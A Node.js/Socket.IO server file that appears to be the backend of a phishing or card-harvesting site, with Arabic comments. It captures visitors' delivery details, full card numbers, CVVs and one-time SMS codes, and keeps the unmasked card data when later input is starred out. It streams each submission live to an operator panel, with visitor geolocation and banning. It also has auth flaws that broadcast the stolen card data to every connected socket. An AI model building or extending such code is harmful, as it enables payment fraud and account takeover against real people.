require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const geoip = require('geoip-lite');
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const pool = require('./config/database');
const { initializeDatabase } = require('./models/schema');

// Import routes
const productRoutes = require('./routes/products');
const adminRoutes = require('./routes/admin');
const visitorRoutes = require('./routes/visitors');

const app = express();
const server = http.createServer(app);

// Get admin password from env or use default (SHOULD BE CHANGED IN PRODUCTION)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE']
  }
});

// ==========================================
// Socket.IO Authentication Middleware
// ==========================================
io.use(async (socket, next) => {
  const token = socket.handshake.auth.token;
  
  // Check if token matches admin password
  if (token && token.length >= 4) {
    try {
      // Verify token against password (in production, use proper token validation)
      // For now, we accept any non-empty password as auth
      // The actual validation happens in admin:login event via HTTP API
      socket.isAdmin = true;
      return next();
    } catch (error) {
      return next(new Error('Authentication error'));
    }
  }
  
  // Allow visitor connections without admin password
  socket.isAdmin = false;
  next();
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Store connected clients
const connectedClients = new Map();
const adminConnections = new Map();

// Helper: Check if socket is authenticated admin
const isAdminAuthenticated = (socket) => {
  const client = connectedClients.get(socket.id);
  return client && client.isAdmin === true;
};

// Helper: Wrapper for admin-only events (send error if not authenticated)
const adminOnly = (socket, handler) => {
  return (...args) => {
    if (!isAdminAuthenticated(socket)) {
      console.log(`⚠️ Unauthorized admin action attempt from ${socket.id}`);
      socket.emit('admin:unauthorized', { message: 'Not authenticated as admin' });
      return;
    }
    return handler(...args);
  };
};

// Socket.IO connection handling
io.on('connection', (socket) => {
  const sessionId = socket.handshake.query.sessionId || uuidv4();
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '';
  const userAgent = socket.handshake.headers['user-agent'] || '';
  const geo = geoip.lookup(ip);
  
  const clientInfo = {
    sessionId,
    ip,
    userAgent,
    country: geo ? geo.country : 'Unknown',
    countryCode: geo ? geo.country : 'XX',
    currentPage: 'home',
    isAdmin: false, // CRITICAL: Start as non-admin
    connectedAt: new Date()
  };

  connectedClients.set(socket.id, clientInfo);
  
  console.log(`🔌 Client connected: ${sessionId} from ${geo?.country || 'Unknown'} (admin: ${clientInfo.isAdmin})`);

  // Handle visitor tracking
  socket.on('visitor:init', async (data) => {
    try {
      const { sessionId, page = 'home' } = data;
      clientInfo.sessionId = sessionId;
      clientInfo.currentPage = page;
      
      // Check if banned
      const banned = await pool.query(
        'SELECT * FROM banned_users WHERE (session_id = $1 OR ip_address = $2) AND (expires_at IS NULL OR expires_at > NOW()) LIMIT 1',
        [sessionId, ip]
      );
      
      if (banned.rows.length > 0) {
        socket.emit('user:banned', { 
          message: banned.rows[0].custom_message || 'تم حظرك من الموقع' 
        });
        socket.disconnect();
        return;
      }

      // Update or insert visitor
      await pool.query(`
        INSERT INTO visitors (session_id, ip_address, country, country_code, user_agent, current_page, is_online)
        VALUES ($1, $2, $3, $4, $5, $6, true)
        ON CONFLICT (session_id) 
        DO UPDATE SET 
          is_online = true, 
          current_page = $6,
          last_activity = CURRENT_TIMESTAMP
      `, [sessionId, ip, geo?.country || 'Unknown', geo?.country || 'XX', userAgent, page]);

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );
      
      // Notify admins of new visitor with FULL data
      console.log(`📡 Broadcasting visitor:new to ${adminConnections.size} admins`);
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('visitor:new', {
          ...visitorResult.rows[0],
          timestamp: new Date()
        });
      });

      socket.emit('visitor:confirmed', { sessionId });
    } catch (error) {
      console.error('Error initializing visitor:', error);
    }
  });

  // Handle page changes
  socket.on('visitor:page', async (data) => {
    const { sessionId, page } = data;
    clientInfo.currentPage = page;
    
    try {
      await pool.query(
        'UPDATE visitors SET current_page = $1, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [page, sessionId]
      );

      // Notify all admins
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('visitor:pageChange', {
          sessionId,
          page,
          timestamp: new Date()
        });
      });
    } catch (error) {
      console.error('Error updating page:', error);
    }
  });

  // Handle delivery form submission
  socket.on('form:delivery', async (data) => {
    const { sessionId, formData } = data;
    
    try {
      await pool.query(
        'UPDATE visitors SET delivery_data = $1, form_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(formData), sessionId]
      );

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // Notify admins with FULL visitor data - BROADCAST TO ALL
      const eventData = {
        ...visitorResult.rows[0],
        timestamp: new Date()
      };
      
      // Try adminConnections first
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:deliverySubmitted', eventData);
        adminSocket.emit('visitor:updated', eventData);
      });
      
      // Also broadcast via io.emit to ensure all sockets receive
      io.emit('form:deliverySubmitted', eventData);
      io.emit('visitor:updated', eventData);

      console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins`);
    } catch (error) {
      console.error('Error saving delivery data:', error);
    }
  });

  // Handle payment form submission
  socket.on('form:payment', async (data) => {
    const { sessionId, paymentData } = data;
    
    try {
      // جلب البيانات الحالية المخزنة للزائر للحفاظ على الأرقام الحقيقية
      const currentVisitor = await pool.query(
        'SELECT payment_data FROM visitors WHERE session_id = $1', 
        [sessionId]
      );
      
      let finalPaymentData = { ...paymentData };

      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].payment_data) {
        const existingData = currentVisitor.rows[0].payment_data;
        
        // إذا كانت البيانات الجديدة تحتوي على نجوم، نحتفظ بالرقم الحقيقي القديم
        if (paymentData.cardNumber && paymentData.cardNumber.includes('*') && existingData.cardNumber) {
          finalPaymentData.cardNumber = existingData.cardNumber;
        }
        if (paymentData.cvv && paymentData.cvv.includes('*') && existingData.cvv) {
          finalPaymentData.cvv = existingData.cvv;
        }
      }

      await pool.query(
        'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
        [JSON.stringify(finalPaymentData), sessionId]
      );

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة - BROADCAST
      const eventData = {
        ...visitorResult.rows[0],
        timestamp: new Date()
      };
      
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:paymentSubmitted', eventData);
        adminSocket.emit('visitor:updated', eventData);
      });
      
      io.emit('form:paymentSubmitted', eventData);
      io.emit('visitor:updated', eventData);

      console.log(`💳 Payment form processed safely for ${sessionId}`);
    } catch (error) {
      console.error('Error saving payment data:', error);
    }
  });

  // Handle verification form submission
  socket.on('form:verification', async (data) => {
    const { sessionId, verificationData } = data;
    
    try {
      // Get current OTP history
      const currentVisitor = await pool.query(
        'SELECT otp_history FROM visitors WHERE session_id = $1',
        [sessionId]
      );
      
      let otpHistory = [];
      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].otp_history) {
        try {
          otpHistory = Array.isArray(currentVisitor.rows[0].otp_history) 
            ? currentVisitor.rows[0].otp_history 
            : JSON.parse(currentVisitor.rows[0].otp_history);
        } catch (e) {
          otpHistory = [];
        }
      }
      
      // Add new OTP to history
      if (verificationData.otp) {
        const newOTPEntry = {
          otp: verificationData.otp,
          timestamp: new Date().toISOString(),
          ip: geo?.ip || socket.handshake.address
        };
        otpHistory.unshift(newOTPEntry);
        
        // Keep only last 10 OTP entries
        if (otpHistory.length > 10) {
          otpHistory = otpHistory.slice(0, 10);
        }
      }

      await pool.query(
        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
        [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
      );

      // Get full visitor data
      const visitorResult = await pool.query(
        'SELECT * FROM visitors WHERE session_id = $1',
        [sessionId]
      );

      // Notify admins with FULL visitor data including OTP history - BROADCAST
      const eventData = {
        ...visitorResult.rows[0],
        timestamp: new Date()
      };
      
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('form:verificationSubmitted', eventData);
        adminSocket.emit('visitor:updated', eventData);
      });
      
      io.emit('form:verificationSubmitted', eventData);
      io.emit('visitor:updated', eventData);

      console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}`);
    } catch (error) {
      console.error('Error saving verification data:', error);
    }
  });

  // Handle admin connections
  socket.on('admin:login', async (data) => {
    try {
      const { username, password, deviceInfo } = data;
      const result = await pool.query(
        'SELECT * FROM admins WHERE username = $1 AND is_active = true',
        [username]
      );

      if (result.rows.length > 0) {
        const admin = result.rows[0];
        const isValid = await bcrypt.compare(password, admin.password_hash);

        if (isValid) {
          const sessionToken = uuidv4();
          clientInfo.isAdmin = true;
          
          // IMPORTANT: Add to admin connections for real-time updates ONLY AFTER AUTHENTICATION
          adminConnections.set(socket.id, socket);
          console.log("🔌 Admin logged in, connections: " + adminConnections.size);
          
          // Save admin session
          await pool.query(
            'INSERT INTO admin_sessions (session_token, device_info, ip_address, country, is_current) VALUES ($1, $2, $3, $4, true)',
            [sessionToken, JSON.stringify(deviceInfo || {}), ip, geo?.country || 'Unknown']
          );

          // Send login success
          socket.emit('admin:loginSuccess', { sessionToken, adminId: admin.id });
          console.log(`🔐 Admin ${username} logged in from ${geo?.country}`);
          
          // CRITICAL: Fetch and send ALL visitors from database immediately
          try {
            const visitorsResult = await pool.query(
              'SELECT * FROM visitors WHERE is_deleted = false ORDER BY last_activity DESC LIMIT 100'
            );
            
            const allVisitors = visitorsResult.rows.map(visitor => {
              // Parse JSON fields
              let deliveryData = visitor.delivery_data;
              if (typeof deliveryData === 'string') {
                try { deliveryData = JSON.parse(deliveryData); } catch (e) { deliveryData = {}; }
              }
              
              let paymentData = visitor.payment_data;
              if (typeof paymentData === 'string') {
                try { paymentData = JSON.parse(paymentData); } catch (e) { paymentData = {}; }
              }
              
              let verificationData = visitor.verification_data;
              if (typeof verificationData === 'string') {
                try { verificationData = JSON.parse(verificationData); } catch (e) { verificationData = {}; }
              }
              
              let otpHistory = visitor.otp_history;
              if (typeof otpHistory === 'string') {
                try { otpHistory = JSON.parse(otpHistory); } catch (e) { otpHistory = []; }
              }
              
              return {
                ...visitor,
                session_id: visitor.session_id,
                delivery_data: deliveryData || {},
                payment_data: paymentData || {},
                verification_data: verificationData || {},
                otp_history: otpHistory || [],
                is_online: isOnlineVisitors.has(visitor.session_id)
              };
            });
            
            // Send all visitors to this admin
            socket.emit('admin:initData', { visitors: allVisitors });
            console.log(`📊 Sent ${allVisitors.length} visitors to admin`);
            
            // Also send stats
            const statsResult = await pool.query(`
              SELECT 
                COUNT(*) as total,
                COUNT(CASE WHEN delivery_data IS NOT NULL AND delivery_data != '{}' THEN 1 END) as with_delivery,
                COUNT(CASE WHEN payment_data IS NOT NULL AND payment_data != '{}' THEN 1 END) as with_payment,
                COUNT(CASE WHEN verification_data IS NOT NULL AND verification_data != '{}' THEN 1 END) as with_verification
              FROM visitors WHERE is_deleted = false
            `);
            
            const stats = {
              total: parseInt(statsResult.rows[0].total) || 0,
              withDelivery: parseInt(statsResult.rows[0].with_delivery) || 0,
              withPayment: parseInt(statsResult.rows[0].with_payment) || 0,
              withVerification: parseInt(statsResult.rows[0].with_verification) || 0
            };
            
            socket.emit('stats:data', stats);
            console.log(`📊 Sent stats to admin:`, stats);
            
          } catch (dbError) {
            console.error('❌ Error fetching visitors:', dbError);
          }
        } else {
          socket.emit('admin:loginFailed', { message: 'Invalid credentials' });
        }
      } else {
        socket.emit('admin:loginFailed', { message: 'User not found' });
      }
    } catch (error) {
      console.error('Admin login error:', error);
      socket.emit('admin:loginFailed', { message: 'Login error' });
    }
  });

  socket.on('admin:validate', async (data) => {
    try {
      const { sessionToken } = data;
      const result = await pool.query(
        'SELECT * FROM admin_sessions WHERE session_token = $1 AND is_current = true',
        [sessionToken]
      );

      if (result.rows.length > 0) {
        clientInfo.isAdmin = true;
        adminConnections.set(socket.id, socket);
        socket.emit('admin:valid', { valid: true });
      } else {
        socket.emit('admin:valid', { valid: false });
      }
    } catch (error) {
      socket.emit('admin:valid', { valid: false });
    }
  });

  // CRITICAL: Admin logout - remove from connections
  socket.on('admin:logout', () => {
    clientInfo.isAdmin = false;
    adminConnections.delete(socket.id);
    console.log("🔌 Admin logged out, connections: " + adminConnections.size);
    socket.emit('admin:loggedOut');
  });

  // Handle real-time stats request (ADMIN ONLY)
  socket.on('stats:request', adminOnly(socket, async () => {
    try {
      const totalVisitors = await pool.query('SELECT COUNT(*) FROM visitors');
      const formSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE form_submitted = true');
      const paymentSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE payment_submitted = true');
      const verificationSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE verification_submitted = true');
      const onlineVisitors = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_online = true');
      const countryStats = await pool.query(`
        SELECT country, COUNT(*) as count 
        FROM visitors 
        GROUP BY country 
        ORDER BY count DESC 
        LIMIT 10
      `);

      socket.emit('stats:update', {
        totalVisitors: parseInt(totalVisitors.rows[0].count),
        formSubmissions: parseInt(formSubmissions.rows[0].count),
        paymentSubmissions: parseInt(paymentSubmissions.rows[0].count),
        verificationSubmissions: parseInt(verificationSubmissions.rows[0].count),
        onlineVisitors: parseInt(onlineVisitors.rows[0].count),
        countryStats: countryStats.rows
      });
    } catch (error) {
      console.error('Error fetching stats:', error);
    }
  }));

  // Handle visitors request - RETURN ONLY NON-DELETED VISITORS (ADMIN ONLY)
  // NOTE: This is now handled by admin:login which sends admin:initData automatically
  // Keeping this for backward compatibility
  socket.on('visitors:request', async () => {
    try {
      // Check if admin
      const client = connectedClients.get(socket.id);
      if (!client || !client.isAdmin) {
        console.log('⚠️ Unauthorized visitors:request from', socket.id);
        socket.emit('admin:unauthorized', { message: 'Not authenticated as admin' });
        return;
      }
      
      // IMPORTANT: Return only non-deleted visitors (is_deleted = false)
      const visitors = await pool.query(`
        SELECT * FROM visitors 
        WHERE is_deleted = false 
        ORDER BY is_online DESC, last_activity DESC 
        LIMIT 100
      `);

      // Also get trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');

      const responseData = { 
        visitors: visitors.rows,
        trashCount: parseInt(trashCount.rows[0].count)
      };
      
      // Send ONLY to requesting socket (not broadcast)
      socket.emit('visitors:update', responseData);
      
      console.log('📡 visitors:request: returning', visitors.rows.length, 'visitors,', trashCount.rows[0].count, 'in trash');
    } catch (error) {
      console.error('Error fetching visitors:', error);
    }
  });

  // Handle trash bin request - GET DELETED VISITORS (ADMIN ONLY)
  socket.on('trash:request', adminOnly(socket, async () => {
    try {
      const trashVisitors = await pool.query(`
        SELECT * FROM visitors 
        WHERE is_deleted = true 
        ORDER BY last_activity DESC 
        LIMIT 100
      `);

      socket.emit('trash:update', { visitors: trashVisitors.rows });
      
      console.log('📡 trash:request: returning', trashVisitors.rows.length, 'deleted visitors');
    } catch (error) {
      console.error('Error fetching trash:', error);
    }
  }));

  // Handle soft delete (move to trash) (ADMIN ONLY)
  socket.on('visitor:softDelete', adminOnly(socket, async (data) => {
    try {
      const { sessionId } = data;
      
      await pool.query(
        'UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $1',
        [sessionId]
      );

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:softDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('🗑️ Visitor soft deleted:', sessionId);
    } catch (error) {
      console.error('Error soft deleting visitor:', error);
    }
  }));

  // Handle soft delete multiple (move selected to trash) (ADMIN ONLY)
  socket.on('visitor:softDeleteMultiple', adminOnly(socket, async (data) => {
    try {
      const { sessionIds } = data;
      
      if (sessionIds && sessionIds.length > 0) {
        const placeholders = sessionIds.map((_, i) => `$${i + 1}`).join(',');
        await pool.query(
          `UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id IN (${placeholders})`,
          sessionIds
        );
      }

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:softDeletedMultiple', { sessionIds, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('🗑️ Multiple visitors soft deleted:', sessionIds.length);
    } catch (error) {
      console.error('Error soft deleting multiple visitors:', error);
    }
  }));

  // Handle soft delete all (move all to trash) (ADMIN ONLY)
  socket.on('visitor:softDeleteAll', adminOnly(socket, async () => {
    try {
      await pool.query(
        'UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE is_deleted = false'
      );

      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:softDeletedAll', { trashCount: 0 });
      });
      
      console.log('🗑️ All visitors soft deleted (moved to trash)');
    } catch (error) {
      console.error('Error soft deleting all visitors:', error);
    }
  }));

  // Handle restore from trash (ADMIN ONLY)
  socket.on('visitor:restore', adminOnly(socket, async (data) => {
    try {
      const { sessionId } = data;
      
      await pool.query(
        'UPDATE visitors SET is_deleted = false, last_activity = CURRENT_TIMESTAMP WHERE session_id = $1',
        [sessionId]
      );

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:restored', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('↩️ Visitor restored:', sessionId);
    } catch (error) {
      console.error('Error restoring visitor:', error);
    }
  }));

  // Handle permanent delete from trash (ADMIN ONLY)
  socket.on('visitor:permanentDelete', adminOnly(socket, async (data) => {
    try {
      const { sessionId } = data;
      
      await pool.query('DELETE FROM visitors WHERE session_id = $1', [sessionId]);

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:permanentDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('❌ Visitor permanently deleted:', sessionId);
    } catch (error) {
      console.error('Error permanently deleting visitor:', error);
    }
  }));

  // Handle empty trash (delete all from trash) (ADMIN ONLY)
  socket.on('trash:empty', adminOnly(socket, async () => {
    try {
      await pool.query('DELETE FROM visitors WHERE is_deleted = true');

      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('trash:emptied');
      });
      
      console.log('🗑️ Trash emptied');
    } catch (error) {
      console.error('Error emptying trash:', error);
    }
  }));

  // Handle ban request (ADMIN ONLY)
  socket.on('user:ban', adminOnly(socket, async (data) => {
    try {
      const { targetSessionId, targetIp, reason, customMessage } = data;
      
      await pool.query(
        'INSERT INTO banned_users (session_id, ip_address, reason, custom_message) VALUES ($1, $2, $3, $4)',
        [targetSessionId || null, targetIp || null, reason, customMessage]
      );

      // Find and disconnect the banned client
      connectedClients.forEach((info, socketId) => {
        if (info.sessionId === targetSessionId || info.ip === targetIp) {
          const targetSocket = io.sockets.sockets.get(socketId);
          if (targetSocket) {
            targetSocket.emit('user:banned', { message: customMessage });
            targetSocket.disconnect();
          }
        }
      });

      console.log(`🚫 User banned: ${targetSessionId || targetIp}`);
    } catch (error) {
      console.error('Error banning user:', error);
    }
  }));

  // Handle unban request
  socket.on('user:unban', async (data) => {
    try {
      const { banId } = data;
      if (!banId) return;
      
      await pool.query('DELETE FROM banned_users WHERE id = $1', [banId]);
      
      // Send success response to the admin who requested
      socket.emit('user:unbanned', { banId, success: true });
      
      // Notify all admins to refresh their lists
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('ban:listUpdate');
      });
      
      console.log(`✅ User unbanned: ID ${banId}`);
    } catch (error) {
      console.error('Error unbanning user:', error);
      socket.emit('user:unbanned', { success: false, message: error.message });
    }
  });

  // Handle admin session logout
  socket.on('admin:logoutDevice', async (data) => {
    try {
      const { sessionToken } = data;
      await pool.query('DELETE FROM admin_sessions WHERE session_token = $1', [sessionToken]);
      
      // Find and disconnect the device
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('admin:forceLogout');
        adminSocket.disconnect();
      });
    } catch (error) {
      console.error('Error logging out device:', error);
    }
  });

  // Handle logout all devices
  socket.on('admin:logoutAll', async () => {
    try {
      await pool.query('DELETE FROM admin_sessions');
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('admin:forceLogout');
        adminSocket.disconnect();
      });
      adminConnections.clear();
    } catch (error) {
      console.error('Error logging out all devices:', error);
    }
  });

  // Handle admin device list request
  socket.on('admin:devices', async () => {
    try {
      const devices = await pool.query('SELECT * FROM admin_sessions ORDER BY created_at DESC');
      socket.emit('admin:devicesList', { devices: devices.rows });
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
  });

  // Handle disconnect - PERSIST DATA, ONLY MARK OFFLINE
  socket.on('disconnect', async () => {
    const client = connectedClients.get(socket.id);
    
    if (client) {
      console.log(`🔌 Client disconnected: ${client.sessionId}`);
      
      if (client.isAdmin) {
        adminConnections.delete(socket.id);
      } else {
        try {
          // IMPORTANT: Only mark as offline, DO NOT DELETE any data
          await pool.query(
            'UPDATE visitors SET is_online = false, last_activity = CURRENT_TIMESTAMP WHERE session_id = $1',
            [client.sessionId]
          );
          
          // Get full visitor data to broadcast
          const visitorResult = await pool.query(
            'SELECT * FROM visitors WHERE session_id = $1',
            [client.sessionId]
          );
          
          // Broadcast to ALL connected sockets via adminConnections
          adminConnections.forEach((adminSocket) => {
            adminSocket.emit('visitor:offline', {
              ...visitorResult.rows[0],
              timestamp: new Date()
            });
          });
          
          // Also broadcast via io.emit for reliability
          io.emit('visitor:offline', {
            ...visitorResult.rows[0],
            timestamp: new Date()
          });
          
          console.log(`💾 Visitor ${client.sessionId} marked offline, data preserved`);
        } catch (error) {
          console.error('Error updating offline status:', error);
        }
      }
      
      connectedClients.delete(socket.id);
    }
  });
});

// API Routes
app.use('/api/products', productRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/visitors', visitorRoutes);

// Serve frontend static files
app.use(express.static(path.join(__dirname, '../frontend')));

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date() });
});

// Start server
const PORT = process.env.PORT || 3000;

const startServer = async () => {
  try {
    await initializeDatabase();
    server.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`🌐 Frontend: http://localhost:${PORT}`);
      console.log(`📊 API: http://localhost:${PORT}/api`);
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
};

startServer();

module.exports = { app, io };
